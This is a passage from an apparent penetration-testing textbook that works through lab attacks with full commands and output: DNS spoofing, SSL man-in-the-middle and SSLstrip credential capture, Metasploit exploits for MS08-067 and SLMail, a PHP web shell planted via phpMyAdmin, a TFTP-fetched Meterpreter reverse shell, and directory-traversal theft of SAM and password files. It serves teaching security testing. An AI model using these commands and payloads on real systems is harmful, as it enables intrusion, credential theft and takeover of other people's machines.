Default Gateway‚Äù on page 165. Now we can start sending DNS cache poisoning attempts using the Dnsspoof DNS spoofing tool, as shown here. 
root@kali:~# dnsspoof -i eth0u -f hosts.txtv
dnsspoof: listening on eth0 [udp dst port 53 and not src 192.168.20.9]
192.168.20.11 > 75.75.75.75.53: 46559+ A? www.gmail.com
We specify the network interface u to use, and point Dnsspoof to the 
file (hosts.txt) we just created v telling it which values to spoof. 
Once Dnsspoof is running, when we run the nslookup command from 
our Linux target, the IP address returned should be our Kali machine‚Äôs, as 
shown in Listing 7-5. This is clearly not the real IP address for Gmail. 
georgia@ubuntu:~$ nslookup www.gmail.com
Server: 75.75.75.75
Address: 75.75.75.75#53
Non-authoritative answer:
Name: www.gmail.com
Address: 192.168.20.9
Listing 7-5: Nslookup after attack 
To demonstrate this attack, set up a website to direct traffic to. The 
Apache server in Kali will by default serve an ‚ÄúIt Works‚Äù page to anyone 
who visits it. We can change the contents of the index.html file in the folder 
/var/www, but the default ‚ÄúIt Works‚Äù text is fine for our purposes. 
Now if we browse to http://www.gmail.com/ from the Ubuntu target, the 
URL bar should say http://www.gmail.com/, but we‚Äôre actually at our Kali 
machine‚Äôs web server, as shown in Figure 7-11. We can even make this attack 
more interesting by cloning the actual Gmail website (or any other site the 
attacker chooses) so the user won‚Äôt notice the difference. 
170 Chapter 7
Figure 7-11: This isn‚Äôt Gmail.
SSL Atta
So far, we‚Äôve been able to intercept encrypted traffic, but we haven‚Äôt been 
able to get any sensitive information out of the encrypted connection. For 
this next attack, we‚Äôll rely on a user‚Äôs willingness to click past an SSL certificate warning to perform a man-in-the-middle attack and get the plaintext 
out of a Secure Sockets Layer (SSL) connection, which encrypts traffic to 
protect it from being read by an eavesdropper. 
SSL Basics 
The goal of SSL is to provide reasonable assurance that any sensitive information (such as credentials or credit card numbers) transmitted between 
a user‚Äôs browser and a server is secure‚Äîunable to be read by a malicious 
entity along the way. To prove that the connection is secure, SSL uses certificates. When you browse to an SSL-enabled site, your browser asks the 
site to identify itself with its SSL certificate. The site presents its certificate, which your browser verifies. If your browser accepts the certificate, it 
informs the server, the server returns a digitally signed acknowledgment, 
and SSL-secured communication begins. 
Capturing Traffic 171
An SSL certificate includes an encryption key pair as well as identifying 
information, such as the domain name and the name of the company that 
owns the site. A server‚Äôs SSL certificate is generally vouched for by a certificate authority (CA) such as VeriSign or Thawte. Browsers come preinstalled 
with a list of trusted CAs, and if a server‚Äôs SSL certificate is vouched for by 
a trusted CA, the browser can create a secure connection. If the certificate 
is untrusted, the user will be presented with a warning that basically says, 
‚ÄúThe connection might be secure, but it might not be. Proceed at your 
own risk.‚Äù 
Using Ettercap for SSL Man-in-the-Middle Attacks
In our ARP cache poisoning attack, we man-in-the-middled the traffic 
between our Windows XP and Ubuntu targets (as well as the Ubuntu target and the Internet). These systems were still able to communicate with 
each other, but our Kali system was able to capture the traffic. We can do 
the same thing to attack SSL traffic. We can break the secure SSL connection by redirecting traffic to and from www.facebook.com to our Kali system 
so we can intercept sensitive information. 
For this example, we‚Äôll use Ettercap, a multifunction suite for man-inthe-middle attacks that, in addition to SSL attacks, can also complete all 
of the attacks we have performed so far with Arpspoof and Dnsspoof. Turn 
off any other spoofing tools before starting Ettercap. See page 22 for configuration instructions.
Ettercap has multiple interfaces, but we will use the -T option for the 
text-based interface in this example. Use the -M option with arp:remote 
/gateway/ /target/ to set up an ARP cache poisoning attack between the 
default gateway and the Linux target, as shown next. The actual attack 
will work the same way as our previous exercise with Arpspoof.
root@kali:~# ettercap -Ti eth0 -M arp:remote /192.168.20.1/ /192.168.20.11/
With Ettercap running, we just wait for users to start interacting with 
SSL-based web servers. Switch over to your Linux target, and attempt to log 
in to a website using SSL. You should be greeted with a certificate warning 
like the one in Figure 7-12. 
Because this is a man-in-the-middle attack, the SSL session‚Äôs security 
cannot be verified. The certificate Ettercap presents isn‚Äôt valid for www
.facebook.com, so the trust is broken, as illustrated in Figure 7-13.
But security warnings don‚Äôt stop all users. If we click through the warning and enter our credentials, Ettercap will grab them in plaintext before 
forwarding them on to the server, as shown here: 
HTTP : 31.13.74.23:443 -> USER: georgia PASS: password INFO: https://www.facebook.com/
172 Chapter 7
Figure 7-12: Facebook cannot be verified.
www.facebook.com
Ubuntu target Kali
Internet HTTPS request for
www.facebook.com
HTTPS request for
www.facebook.com
HTTPS response from
www.facebook.com
HTTPS response from
www.facebook.com
(certificate from Ettercap is
invalid for www.facebook.com)
Figure 7-13: SSL man-in-the-middle attack 
Capturing Traffic 173
SSL Stripp
Of course, the trouble with SSL man-in-the-middle attacks is that users have 
to click through the SSL certificate warning. Depending on the browser, 
this can be an involved process that is difficult, if not impossible, for a user 
to ignore. Most readers can probably think of a time they clicked through a 
security warning and continued to the page despite their better judgment. 
(Case in point: Our default Nessus install uses Tenable‚Äôs self-signed certificate, which throws a certificate error when you browse to the web interface. 
If you chose to follow along with that example, you most likely decided to 
click through the warning.)
It is difficult to say how effective certificate warnings are at stopping 
users from visiting HTTPS sites without valid certificates. I have run socialengineering tests that employed self-signed SSL certificates, and the success 
rate has been significantly lower than those with valid certificates or those 
that don‚Äôt use HTTPS. Though some users did click through and visit the 
sites, a more sophisticated attack would allow us to capture information in 
plaintext without triggering those obvious warnings that the SSL connection is compromised. 
With SSL stripping, we man-in-the-middle the HTTP connection before 
it is redirected to SSL and add SSL functionality before sending the packets on to the web server. When the web server replies, SSL stripping again 
intercepts the traffic and removes the HTTPS tags before sending the packets to the client. This technique is illustrated in Figure 7-14. 
www.facebook.com
Ubuntu target Kali
Internet HTTP request for
www.facebook.com
HTTPS request for
www.facebook.com
HTTPS response from
www.facebook.com
HTTP response from
www.facebook.com
Figure 7-14: SSL stripping attack 
Moxie Marlinspike, the author of SSLstrip, called certificate warnings 
negative feedback, as opposed to positive feedback that a session is valid, such as 
seeing HTTPS in the browser URL bar. Avoiding this negative feedback is 
174 Chapter 7
much more important to an attack‚Äôs success than including positive feedback because users are naturally less likely to notice that a URL says HTTP 
instead of HTTPS than they are a giant certificate warning they have to 
actively click through. SSL stripping avoids the certificate warning by again 
man-in-the-middling the connection. 
Users typically encounter HTTPS either through clicking links or 
through HTTP 302 redirects. Most users don‚Äôt enter https://www.facebook.com
or even http://www.facebook.com into their browsers; they type www.facebook
.com or sometimes just facebook.com. And that‚Äôs why this attack is possible. 
SSLstrip adds the HTTPS itself and thus the SSL connection between 
Facebook and Kali is valid. SSLstrip just turns the connection back to 
HTTP to send to the original requester. There is no certificate warning.
Using SSLstrip
The tool SSLstrip implements SSL stripping. Before we start it, we need to set 
an Iptables rule to pass traffic that is headed to port 80 through SSLstrip. 
We‚Äôll run SSLstrip on port 8080, as shown next, then restart Arpspoof and 
spoof the default gateway. (For instructions, jump back to ‚ÄúUsing ARP 
Cache Poisoning to Impersonate the Default Gateway‚Äù on page 165.)
root@kali:# iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
Now start SSLstrip, and tell it to listen on port 8080 with the -l flag. 
root@kali:# sslstrip -l 8080
Next, browse to a site that uses SSL (try any Internet site that requires 
login credentials) from your Linux target, like the Twitter login page shown 
in Figure 7-15. As you can see, HTTP has replaced HTTPS in the address bar. 
When you log in, your credentials will be reported in plaintext by SSLstrip. 
(No, my Twitter password isn‚Äôt really ‚Äúpassword.‚Äù) 
This attack is more sophisticated than a straight SSL man-in-the-middle 
attack. We are able to avoid the certificate warning because the server is 
completing an SSL connection with SSLstrip rather than the browser. 
2015-12-28 19:16:35,323 SECURE POST Data (twitter.com):
session%5Busername_or_email%5D=georgiaweidman&session%5Bpassword%5D=password&s
cribe_log=&redirect_after_login=%2F&authenticity_token=a26a0faf67c2e11e6738053
c81beb4b8ffa45c6a
As you can see, SSLstrip reports the entered credentials (georgiaweidman:
password) in plaintext.
Capturing Traffic 175
Figure 7-15: Twitter login page with SSLstrip running
Summar
In this chapter we‚Äôve fiddled with network traffic to create some interesting 
results. Using various tools and techniques, we were able to intercept traffic 
that we had no business seeing in a switched network. We used ARP cache 
poisoning to redirect traffic in a switched network to our Kali system and 
DNS cache poisoning to redirect users to our web servers. We used Ettercap 
to automate an SSL man-in-the-middle attack and (assuming that the user 
clicks through a warning) capture sensitive information in plaintext. Finally, 
we made the attack even more sophisticated by avoiding an invalid certificate warning using SSL stripping. 
Capturing traffic from the local network can glean useful information 
for our pentest. For example, we were able to capture valid credentials for 
the FTP server for use in exploitation. 
Speaking of exploitation, let‚Äôs get started. 

Part I
Attack

8
E x ploitati
After all that preparatory work we finally get to the 
fun stuff: exploitation. In the exploitation phase of 
the pentest, we run exploits against the vulnerabilities 
we have discovered to gain access to target systems. 
Some vulnerabilities, such as the use of default passwords, are so easy to exploit, it hardly feels like exploitation at all. Others are much more complicated.
In this chapter we‚Äôll look at exploiting the vulnerabilities we identified in 
Chapter 6 to gain a foothold in target machines. We‚Äôll return to our friend 
MS08-067 from Chapter 4, now that we have more background about the 
vulnerability. We‚Äôll also exploit an issue in the SLMail POP3 server with a 
Metasploit module. In addition, we‚Äôll piggyback on a previous compromise 
and bypass login on the FTP server on our Linux target. We will exploit 
a vulnerability in the TikiWiki install on the Linux target and a couple of 
180 Chapter 8
default password issues on an XAMPP install on the Windows target. We‚Äôll 
also take advantage of a readable and writable NFS share to take control of 
the SSH keys and log in as a valid user without knowing the password. We 
will interact with a fragile web server on a nonstandard port to take advantage of a directory traversal issue and download system files. For a refresher 
on how we discovered each of the issues we‚Äôll use for exploitation, refer 
back to Chapter 6. 
Revisiting MS08-
We know from Chapter 6 that the SMB server on our Windows XP target is 
missing the MS08-067 patch. The MS08-067 vulnerability has a good reputation for successful exploits, and the corresponding Metasploit module is 
ranked as great. We used this vulnerability as an example in Chapter 4, but 
the knowledge we gained in the previous chapters gives us solid evidence 
that this exploit will result in a compromise. 
When we viewed the options for the windows/smb/ms08_067_netapi module in Chapter 4, we saw the usual RHOST and RPORT as well as SMBPIPE, which 
allows us to set the pipe that our exploit will use. The default is the browser 
pipe, though we can also use SRVSRC. In Chapter 4, we ran the Metasploit 
module scanner/smb/pipe_auditor to enumerate the listening SMB pipes 
and found that only the browser pipe is available. Thus, we know that the 
default SMBPIPE option, BROWSER, is the only one that will work.
Metasploit Payloads 
As we discussed in Chapter 4, payloads allow us to tell an exploited system 
to do things on our behalf. Though many payloads are either bind shells, 
which listen on a local port on the target machine, or reverse shells, which 
call back to a listener on the attack system, other payloads perform specific 
functions. For example, if you run the payload osx/armle/vibrate on an iPhone, 
the phone will vibrate. There are also payloads to add a new user account: 
linux/x86/adduser for Linux systems and windows/adduser for Windows. 
We can download and execute a file with windows/download_exec_https or 
execute a command with windows/exec. We can even use the speech API to 
make the target say ‚ÄúPwned‚Äù with windows/speak_pwned. 
Recall that we can see all the payloads available in Metasploit by entering show payloads at the root of Msfconsole. Enter this command after you 
tell Metasploit to use the windows/smb/ms08_067_netapi module so you can 
see only payloads that are compatible with the MS08-067 exploit.
In Chapter 4, we used windows/shell_reverse_tcp, but looking through the 
list, we also see a payload called windows/shell/reverse_tcp. 
windows/shell/reverse_tcp normal Windows Command Shell, Reverse TCP Stager 
windows/shell_reverse_tcp normal Windows Command Shell, Reverse TCP Inline
Exploitation 181
Both payloads create Windows command shells using a reverse connection (discussed in Chapter 4). The exploited machine will connect back to 
our Kali machine at the IP address and port specified in the payload options. 
Any of the payloads listed for the windows/smb/ms08_067_netapi will work just 
fine, but in different pentesting scenarios, you may have to get creative. 
Staged Payloads
The windows/shell/reverse_tcp payload is staged. If we use it with the windows/
smb/ms08_067_netapi exploit, the string sent to the SMB server to take 
control of the target machine does not contain all of the instructions to 
create the reverse shell. Instead, it contains a stager payload with just enough 
information to connect back to the attack machine and ask Metasploit for 
instructions on what to do next. When we launch the exploit, Metasploit 
sets up a handler for the windows/shell/reverse_tcp payload to catch the incoming reverse connection and serve up the rest of the payload‚Äîin this case 
a reverse shell‚Äîthen the completed payload is executed, and Metasploit‚Äôs 
handler catches the reverse shell. The amount of memory space available for 
a payload may be limited, and some advanced Metasploit payloads can take 
up a lot of space. Staged payloads allow us to use complex payloads without 
requiring a lot of space in memory. 
Inline Payloads
The windows/shell_reverse_tcp payload is an inline, or single, payload. Its 
exploit string contains all the code necessary to push a reverse shell back 
to the attacker machine. Though inline payloads take up more space 
than staged payloads, they are more stable and consistent because all 
the instructions are included in the original exploit string. You can distinguish inline and staged payloads by the syntax of their module name. 
For example, windows/shell/reverse_tcp or windows/meterpreter/bind_tcp are 
staged, whereas windows/shell_reverse_tcp is inline. 
Meterpreter 
Meterpreter is a custom payload written for the Metasploit Project. It is 
loaded directly into the memory of an exploited process using a technique 
known as reflective dll injection. As such, Meterpreter resides entirely in memory and writes nothing to the disk. It runs inside the memory of the host 
process, so it doesn‚Äôt need to start a new process that might be noticed by an 
intrusion prevention or intrusion detection system (IPS/IDS). Meterpreter 
also uses Transport Layer Security (TLS) encryption for communication 
between it and Metasploit. You can think of Meterpreter as a kind of shell 
and then some. It has additional useful commands that we can use, such as 
hashdump, which allows us to gain access to local Windows password hashes. 
(We‚Äôll look at many Meterpreter commands when we study post exploitation in Chapter 13.)
182 Chapter 8
We saw in Chapter 4 that Metasploit‚Äôs default payload for the windows/
smb/ms08_067_netapi is windows/meterpreter/reverse_tcp. Let‚Äôs use the windows/
meterpreter/reverse_tcp payload with our MS08-067 exploit this time. Our payload options should be familiar from other reverse payloads we have used 
so far. Let‚Äôs set our payload and run the exploit, as shown in Listing 8-1.
msf exploit(ms08_067_netapi) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(ms08_067_netapi) > set LHOST 192.168.20.9 
LHOST => 192.168.20.9
msf exploit(ms08_067_netapi) > exploit
[*] Started reverse handler on 192.168.20.9:4444
[*] Automatically detecting the target...
[*] Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] Attempting to trigger the vulnerability...
[*] Sending Stage to 192.168.20.10...
[*] Meterpreter session 1 opened (192.168.20.9:4444 -> 192.168.20.10:4312) at 
2015-01-12 00:11:58 -0500
Listing 8-1: Exploiting MS08-067 with a Meterpreter payload 
As the output shows, running this exploit should open a Meterpreter 
session that we‚Äôll be able to use for post exploitation. 
Exploiting WebDAV Default Creden
In Chapter 6, we found that the XAMPP installation on our Windows XP 
target employs default login credentials for the WebDAV folder used to 
upload files to the web server. This issue allows us to upload our own pages 
to the server with Cadaver, a command line client for WebDAV, which we 
used to verify this vulnerability in Chapter 6. Let‚Äôs create a simple test file 
to upload: 
root@kali:~# cat test.txt
test
Now use Cadaver with the credentials wampp:xampp to authenticate 
with WebDAV.
root@kali:~# cadaver http://192.168.20.10/webdav
Authentication required for XAMPP with WebDAV on server `192.168.20.10':
Username: wampp
Password: 
dav:/webdav/> 
Finally, use WebDAV‚Äôs put command to upload our test.txt file to the web 
server. 
Exploitation 183
dav:/webdav/> put test.txt
Uploading test.txt to `/webdav/test.txt':
Progress: [=============================>] 100.0% of 5 bytes succeeded.
dav:/webdav/>
If you browse to /webdav/test.txt, you should see that we have successfully 
uploaded our text file to the website, as shown in Figure 8-1. 
Figure 8-1: A file uploaded with WebDAV
Running a Script on the Target Web Server
A text file is not very useful to us; it would be better if we could upload a 
script and execute it on the web server, allowing us to run commands on 
the underlying system‚Äôs Apache web server. If Apache is installed as a system 
service, it will have system-level privileges, which we could use to gain maximum control over our target. If not, Apache will run with privileges of the 
user who started it. Either way, you should end up with a good deal of control over the underlying system just by dropping a file on the web server.
Let‚Äôs start by confirming that our WebDAV user is allowed to upload 
scripts to the server. Because we found phpMyAdmin software on this web 
server in Chapter 6, we know that the XAMPP software includes PHP. If we 
upload and execute a PHP file, we should be able to run commands on the 
system using PHP. 
dav:/webdav/> put test.php
Uploading test.php to `/webdav/test.php':
Progress: [=============================>] 100.0% of 5 bytes succeeded.
dav:/webdav/> 
N ote Some open WebDAV servers allow uploading text files but block script files like .asp or
.php. Lucky for us, that isn‚Äôt the case here, and we successfully uploaded test.php.
Uploading a Msfvenom Payload
In addition to uploading any PHP scripts we‚Äôve created to perform tasks on 
the target, we can also use Msfvenom to generate a stand-alone Metasploit 
payload to upload to the server. We used Msfvenom briefly in Chapter 4, 
but to brush up on syntax, you can enter msfvenom -h for help. When you‚Äôre 
ready, list all the available payloads with the -l option for PHP payloads, as 
shown in Listing 8-2.
184 Chapter 8
root@kali:~# msfvenom -l payloads
 php/bind_perlu Listen for a connection and spawn a command 
 shell via perl (persistent)
 php/bind_perl_ipv6 Listen for a connection and spawn a command 
 shell via perl (persistent) over IPv6
 php/bind_php Listen for a connection and spawn a command 
 shell via php
 php/bind_php_ipv6 Listen for a connection and spawn a command 
 shell via php (IPv6)
 php/download_execv Download an EXE from an HTTP URL and execute it
 php/exec Execute a single system command
 php/meterpreter/bind_tcpw Listen for a connection over IPv6, Run a 
 meterpreter server in PHP
 php/meterpreter/reverse_tcp Reverse PHP connect back stager with checks 
 for disabled functions, Run a meterpreter 
 server in PHP
 php/meterpreter_reverse_tcp Connect back to attacker and spawn a 
 Meterpreter server (PHP)
 php/reverse_perl Creates an interactive shell via perl
 php/reverse_php Reverse PHP connect back shell with checks 
 for disabled functions
 php/shell_findsock 
Listing 8-2: Metasploit PHP payloads 
Msfvenom gives us a few options: We can download and execute a file on 
the system v, create a shell u, or even use Meterpreter w. Any of these payloads will give us control of the system, but let‚Äôs use php/meterpreter/reverse_tcp. 
After we specify a payload, we can use -o to find out which options we need to 
use with it, as shown here.
root@kali:~# msfvenom -p php/meterpreter/reverse_tcp -o
[*] Options for payload/php/meterpreter/reverse_tcp
--snip--
 Name Current Setting Required Description
 ---- --------------- -------- -----------
 LHOST yes The listen address
 LPORT 4444 yes The listen port
As you can see we need to set LHOST to tell the payload which IP 
address to connect back to, and we can also change the LPORT option. 
Because this payload is already in PHP format, we can output it in the 
raw format with the -f option after we set our options, and then pipe 
the raw PHP code into a file with the .php extension for posting to the 
server, as shown here.
root@kali:~# msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.20.9 
LPORT=2323 -f raw > meterpreter.php
Exploitation 185
Now we upload the file using WebDAV. 
dav:/webdav/> put meterpreter.php
Uploading meterpreter.php to `/webdav/meterpreter.php':
Progress: [=============================>] 100.0% of 1317 bytes succeeded.
As in Chapter 4, we need to set up a handler in Msfconsole to catch the 
payload before we execute the script (see Listing 8-3). 
msf > use multi/handler
msf exploit(handler) > set payload php/meterpreter/reverse_tcpu
payload => php/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.20.9v
lhost => 192.168.20.9
msf exploit(handler) > set LPORT 2323w
lport => 2323
msf exploit(handler) > exploit
[*] Started reverse handler on 192.168.20.9:2323 
[*] Starting the payload handler...
Listing 8-3: Setting up the payload handler
Use multi/handler in Msfconsole, set the payload to php/meterpreter/
reverse_tcp u, and set LHOST v and LPORT w appropriately to match the 
generated payload. If this process is unfamiliar to you, jump back to the 
‚ÄúCreating Standalone Payloads with Msfvenom‚Äù on page 103.
Running the uploaded payload by opening it in a web browser should 
provide us with a Meterpreter session that we can see when we return to 
Msfconsole, as shown here.
[*] Sending stage (39217 bytes) to 192.168.20.10
[*] Meterpreter session 2 opened (192.168.20.9:2323 -> 192.168.20.10:1301) at 
2015-01-07 17:27:44 -0500
meterpreter > 
We can use the Meterpreter command getuid to see what privileges our 
session has on the exploited target. Generally speaking, we get the privileges of the software we exploited. 
meterpreter > getuid
BOOKXP\SYSTEM 
We now have system privileges, which will allow us to take complete 
control of the Windows system. (It‚Äôs generally a bad idea to allow web server 
software to have system privileges for just this reason. Because XAMPP‚Äôs 
Apache server is running as a system service, we have full access to the 
underlying system.)
Now let‚Äôs look at another issue with our XAMPP install.
186 Chapter 8
Exploiting Open phpMyA
The same target XAMPP platform exploited in the previous section also 
includes an open phpMyAdmin install, which we can exploit to run commands on the database server. Like Apache, our MySQL server will have 
either system privileges (if it is installed as a Windows service) or the privileges of the user that started the MySQL process. By accessing the MySQL 
database, we can perform an attack similar to our WebDAV attack and 
upload scripts to the web server using MySQL queries. 
To explore this attack, first navigate to http://192.168.20.10/phpmyadmin, 
and click the SQL tab at the top. We‚Äôll use MySQL to write a script to the 
web server that we‚Äôll use to get a remote shell. We‚Äôll use a SQL SELECT
statement to output a PHP script to a file on the web server, which will 
allow us to remotely control the target system. We‚Äôll use the script <?php 
system($_GET['cmd']); ?> to grab the cmd parameter from the URL and execute it using the system() command. 
The default install location for XAMPP‚Äôs Apache on Windows is 
C:\xampp\htodcs\. The syntax for our command is: SELECT "<script string>" 
into outfile "path_to_file_on_web_server". Our completed command looks 
like this: 
SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\shell.php" 
N ote We use double backslashes to escape, so we don‚Äôt end up with the file
C:xampphtdocsshell.php, which we will not be able to access from 
the web server.
Figure 8-2 shows the command entered into the SQL console in 
phpMyAdmin.
Figure 8-2: Executing SQL commands
Exploitation 187
Run the completed query in phpMyAdmin, and then browse to the 
newly created file, http://192.168.20.10/shell.php. The script should throw the 
error Warning: system() [function.system]: Cannot execute a blank command in C:\
xampp\htdocs\shell.php on line 1, because we did not supply an cmd parameter. 
(Recall from earlier that shell.php grabs the cmd parameter from the URL 
and runs it using the PHP system() command.) We need to supply a cmd
parameter that tells the script the command we‚Äôd like to run on the target 
system. For example, we can ask the Windows XP target to tell us its networking information using ipconfig as the cmd parameter, like so: 
http://192.168.20.10/shell.php?cmd=ipconfig
The result is shown in Figure 8-3.
Figure 8-3: Code execution
Downloading a File with TFTP
The previous steps give us a shell with system privileges, which we ‚Äúupgrade‚Äù 
by uploading a more complicated PHP script. But rather than creating a 
really long and complicated SQL SELECT query, we can host a file on our 
Kali machine and then use our PHP shell to pull it down to the web server. 
On Linux, we could use wget to download files from the command line. 
This functionality is painfully absent on Windows, but we can use TFTP on 
Windows XP. Let‚Äôs use it to upload meterpreter.php from the previous section.
N ote TFTP is not the only way we can transfer files with noninteractive command line
access. In fact, some newer Windows systems do not have TFTP enabled by default. 
You can also have FTP read settings from a file with the -s option or use a scripting language such as Visual Basic or Powershell on the latest Windows operating 
systems. 
We can use the Atftpd TFTP server to host files on our Kali system. 
Start Atftpd in daemon mode, serving files from the location of your 
meterpreter.php script. 
root@kali:~# atftpd --daemon --bind-address 192.168.20.9 /tmp
Set the cmd parameter in the shell.php script as follows:
http://192.168.20.10/shell.php?cmd=tftp 192.168.20.9 get meterpreter.php 
C:\\xampp\\htdocs\\meterpreter.php 
188 Chapter 8
This command should pull down meterpreter.php to the target‚Äôs Apache 
directory using TFTP, as shown in Figure 8-4.
Figure 8-4: Transferring files with TFTP
Now we can browse to http://192.168.20.10/meterpreter.php to open a 
Meterpreter shell. (Be sure to restart the handler to catch the Meterpreter 
connection before executing the script.) And as you can see, though we 
used an attack different from uploading a file through WebDAV, we ended 
up in the same place: We have a Meterpreter shell from the web server 
using its access to the MySQL server to upload files. 
Now let‚Äôs look at attacking the other web server on the Windows XP 
system. 
note This is not the only way we could exploit database access. For example, if you find a 
Microsoft MS SQL database instead, you may be able to use the xp_cmdshell() function, which acts as a built-in system command shell. For security reasons, it is disabled 
on newer versions of MS SQL, but a user with administrative privileges should be 
able to reenable it, giving you shell access without having to upload anything.
Downloading Sensitive Fil
Recall from Chapter 6 that our Zervit server on port 3232 has a directory 
traversal issue that will allow us to download files from the remote system 
without authentication. We can download the Windows boot.ini configuration file (and other files, too) through the browser with the following URL:
http://192.168.20.10:3232/index.html?../../../../../../boot.ini
We‚Äôll use this ability to pull files containing password hashes (encrypted 
passwords) for Windows, as well as installed services.
Downloading a Configuration File
The default install location for XAMPP is C:\xampp, so we can expect the 
directory for FileZilla FTP server to be at C:\xampp\FileZillaFtp. A little 
online research on FileZilla tells us that it stores MD5 hashes of passwords 
in the FileZilla Server.xml configuration file. Depending on the strength of 
the FTP passwords stored in this file, we may be able to use the MD5 hash 
value to recover users‚Äô plaintext FTP passwords. 
We captured the password for user georgia in Chapter 7, but our target 
may contain additional accounts. Let‚Äôs use the Zervit server to download 
the FileZilla configuration file from http://192.168.20.10:3232/index.html?
../../../../../../xampp/FileZillaFtp/FileZilla%20Server.xml. (Note that %20 is 
Exploitation 189
hex encoding for a space.) You can see some of the contents of the file in 
Listing 8-4.
<User Name="georgia">
<Option Name="Pass">5f4dcc3b5aa765d61d8327deb882cf99</Option>
<Option Name="Group"/>
<Option Name="Bypass server userlimit">0</Option>
<Option Name="User Limit">0</Option>
<Option Name="IP Limit">0</Option>
--snip--
Listing 8-4: FileZilla FTP configuration file
As you can see, the configuration file contains two user accounts (in 
the User Name fields): georgia and newuser. Now all we have to do is figure 
out their passwords based on the stored hashes. 
We‚Äôll look at turning password hashes back into plaintext passwords 
(including MD5 hashes) in the next chapter.
Downloading the Windows SAM 
Speaking of passwords, in addition to the FTP user passwords, we can try 
pulling down the Windows Security Accounts Manager (SAM) file that stores 
Windows hashes. The SAM file is obfuscated because the Windows Syskey 
utility encrypts the password hashes inside the SAM file with 128-bit Rivest 
Cipher 4 (RC4) to provide additional security. Even if an attacker or pentester is able to gain access to the SAM file, there is a bit more work to do to 
recover the password hashes. We need a key to reverse the RC4 encryption 
on the hashes. The encryption key for the Syskey utility, called the bootkey, 
is stored inside of the Windows SYSTEM file. We need to download both 
the SAM and SYSTEM files to recover the hashes and attempt to reverse 
them into plaintext passwords. In Windows XP, these files are located at 
C:\Windows\System32\config, so let‚Äôs try downloading the SAM file from the 
following URL: 
http://192.168.20.10:3232/index.html?../../../../../../WINDOWS/system32/config/sam
When we try to use Zervit to download this file, we get a ‚Äúfile not 
found‚Äù error. It looks like our Zervit server doesn‚Äôt have access to this file. 
Luckily, Windows XP backs up both the SAM and SYSTEM files to the 
C:\Windows\repair directory, and if we try to pull down the files from there, 
Zervit is able to serve them. These URLs should do the trick: 
http://192.168.20.10:3232/index.html?../../../../../../WINDOWS/repair/system
http://192.168.20.10:3232/index.html?../../../../../../WINDOWS/repair/sam
N ote Like our MD5 hashes, we‚Äôll use the Windows SAM file in the next chapter when we
cover password attacks in depth. 
190 Chapter 8
Exploiting a Buffer Overflow in Third-Party Soft
In Chapter 6, we never did find out for sure if the SLMail server on our 
Windows XP target is vulnerable to the POP3 issue CVE-2003-0264. The 
version number reported by SLMail (5.5) appears to line up with the vulnerability, so let‚Äôs try exploiting it. The corresponding Metasploit module, 
windows/pop3/seattlelab_pass, has a rank of great. (A ranking that high is 
unlikely to crash the service if it fails.)
Windows/pop3/seattlelab_pass attempts to exploit a buffer overflow in the 
POP3 server. Using it is similar to setting up the MS08-067 exploit, as shown 
in Listing 8-5.
msf > use windows/pop3/seattlelab_pass
msf exploit(seattlelab_pass) > show payloads
Compatible Payloads
===================
 Name Disclosure Date Rank Description
 ---- --------------- ---- -----------
 generic/custom normal Custom Payload
 generic/debug_trap normal Generic x86 Debug Trap
--snip--
msf exploit(seattlelab_pass) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(seattlelab_pass) > show options
Module options (exploit/windows/pop3/seattlelab_pass):
 Name Current Setting Required Description
 ---- --------------- -------- -----------
 RHOST 192.168.20.10 yes The target address
 RPORT 110 yes The target port
Payload options (windows/meterpreter/reverse_tcp):
 Name Current Setting Required Description
 ---- --------------- -------- -----------
 EXITFUNC thread yes Exit technique: seh, thread, process, none
 LHOST yes The listen address
 LPORT 4444 yes The listen port
Exploit target:
 Id Name
 -- ----
 0 Windows NT/2000/XP/2003 (SLMail 5.5)
msf exploit(seattlelab_pass) > set RHOST 192.168.20.10
RHOST => 192.168.20.10
Exploitation 191
msf exploit(seattlelab_pass) > set LHOST 192.168.20.9
LHOST => 192.168.20.9
msf exploit(seattlelab_pass) > exploit
[*] Started reverse handler on 192.168.20.9:4444 
[*] Trying Windows NT/2000/XP/2003 (SLMail 5.5) using jmp esp at 5f4a358f
[*] Sending stage (752128 bytes) to 192.168.20.10
[*] Meterpreter session 4 opened (192.168.20.9:4444 -> 192.168.20.10:1566) at 2015-01-07 
19:57:22 -0500
meterpreter > 
Listing 8-5: Exploiting SLMail 5.5 POP3 with Metasploit
Running this exploit should give us another Meterpreter session on 
the Windows XP target‚Äîyet another way to take control of the system. 
(In Chapter 13, which covers post exploitation, we‚Äôll see what to do once 
we have a Meterpreter session on a target.) 
Exploiting Third-Party Web Applicat
In Chapter 6, we used the Nikto web scanner against our Linux target and 
discovered an installation of the TikiWiki CMS software version 1.9.8 with 
a code execution vulnerability in the script graph_formula.php. A search for 
TikiWiki in Metasploit returns several modules, as shown in Listing 8-6. 
msf exploit(seattlelab_pass) > search tikiwiki
Matching Modules
================
 Name Disclosure Date Rank Description
 ---- --------------- ---- -----------
 --snip--
uexploit/unix/webapp/tikiwiki_graph_formula_exec 2007-10-10 00:00:00 UTC excellent TikiWiki graph_
 formula Remote
 PHP Code 
 Execution
 exploit/unix/webapp/tikiwiki_jhot_exec 2006-09-02 00:00:00 UTC excellent TikiWiki jhot 
 Remote Command 
 Execution
--snip--
msf exploit(seattlelab_pass) > info unix/webapp/tikiwiki_graph_formula_exec
 Name: TikiWiki tiki-graph_formula Remote PHP Code Execution
 Module: exploit/unix/webapp/tikiwiki_graph_formula_exec
 --snip--
 TikiWiki (<= 1.9.8) contains a flaw that may allow a remote attacker 
 to execute arbitrary PHP code. The issue is due to 
 'tiki-graph_formula.php' script not properly sanitizing user input 
 supplied to create_function(), which may allow a remote attacker to 
 execute arbitrary PHP code resulting in a loss of integrity.
192 Chapter 8
References:
 http://cve.mitre.org/cgi-bin/cvename.cgi?name=2007-5423
 http://www.osvdb.org/40478v
 http://www.securityfocus.com/bid/26006
Listing 8-6: TikiWiki exploit information 
